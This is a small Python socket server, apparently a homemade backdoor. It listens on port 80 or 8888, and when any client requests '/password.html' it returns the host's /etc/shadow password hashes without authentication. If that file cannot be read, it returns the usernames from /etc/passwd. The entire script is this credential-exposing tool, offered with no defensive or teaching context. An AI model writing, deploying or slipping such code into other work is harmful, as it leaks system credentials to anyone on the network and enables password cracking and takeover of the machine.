import socket
#get the users 
def users():
    users = []
    with open("/etc/passwd","r") as file:
        for i in (file):
            users.append(i.split(":")[0])
        return users
#get passwords
def passwords():
    password = []
    try:
        with open("/etc/shadow", "r") as file2:
            for i in (file2):
                password.append(i)
            return password
    except Exception as error:
        print(error)
        return False
#creating the socket
try:
    mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mySocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    print("***Socket has been created***")
except socket.error as Error:
    print("Scoket couldn't be created Error:{}".format(Error))
#connection with port 80 or 8888
def connPort(host):
    try:
        port = 80
        conn80 = mySocket.bind((host, port))
        print("You're connected to port: {}".format(port))
        return conn80
    except socket.error as sudo:
        print("Error with port 80: {}".format(sudo))
        port = 8888
        conn8888 = mySocket.bind((host, port))
        print("You're connected to port: {}".format(port))
        return conn8888
connPort("")
mySocket.listen(1)
#while loop 
while True:
    client, add = mySocket.accept()
    msgHost = client.recv(1024)
    msgHost = msgHost.decode('utf-8')
    #print(msgHost)
    separate = msgHost.split("\n")
    #print(separate)
    url = separate[0]
    #print(url)
    if url == "GET /password.html HTTP/1.1\r":
        #client.send(b"GOOD: Page found")
        if passwords():
            Bytes = str.encode(str(passwords()),'utf-8')
            client.send(Bytes)
            print("contrasenyas enviadas")
        else:
            Bytes = str.encode(str(users()),'utf-8')
            client.send(Bytes)
            print("usuarios enviados")
    else:
        client.send(b"WRONG: Page not Found")
    client.close()









